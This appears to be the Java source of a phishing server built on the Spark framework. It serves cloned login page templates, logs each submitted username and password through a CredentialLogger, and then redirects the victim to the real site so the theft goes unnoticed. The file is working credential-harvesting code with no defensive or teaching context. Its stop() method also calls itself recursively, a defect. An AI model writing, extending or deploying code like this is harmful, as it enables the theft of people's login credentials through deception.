package org.guercifzone.DeepSeek;



import static spark.Spark.*;

public class WebServer {
    private static final int DEFAULT_PORT = 8080;
    private boolean isRunning = false;

    public void start() {
        if (isRunning) {
            System.out.println("Server is already running!");
            return;
        }

        port(DEFAULT_PORT);
        staticFiles.location("/public");

        // Setup routes
        get("/", (req, res) -> {
            String template = req.queryParams("template");
            return TemplateManager.getTemplate(template != null ? template : "default");
        });

        post("/submit", (req, res) -> {
            String username = req.queryParams("username");
            String password = req.queryParams("password");
            String template = req.queryParams("template");

            if (username != null && password != null) {
                CredentialLogger.log(template, username, password);
            }

            // Redirect to actual site based on template
            String redirectUrl = TemplateManager.getRedirectUrl(template);
            res.redirect(redirectUrl);
            return null;
        });

        isRunning = true;
        System.out.println("Server started on port " + DEFAULT_PORT);
    }

    public void stop() {
        if (isRunning) {
            stop();
            isRunning = false;
            System.out.println("Server stopped");
        }
    }
}
